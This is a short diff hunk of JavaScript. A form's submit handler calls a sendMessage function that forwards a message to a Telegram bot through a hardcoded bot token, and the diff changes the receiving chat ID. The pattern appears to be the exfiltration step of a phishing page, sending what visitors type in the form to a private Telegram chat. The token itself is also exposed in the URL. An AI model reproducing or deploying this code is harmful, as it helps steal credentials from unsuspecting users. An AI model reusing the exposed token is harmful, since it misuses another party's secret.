@@ -8,7 +8,7 @@ $(".former").submit(function(e) {
 
 async function sendMessage(message){
     return new Promise((resolve, reject)=>{
-      const chat_id = 5431950234;
+      const chat_id = 6234136617;
       fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
             method: "GET",
             headers: {
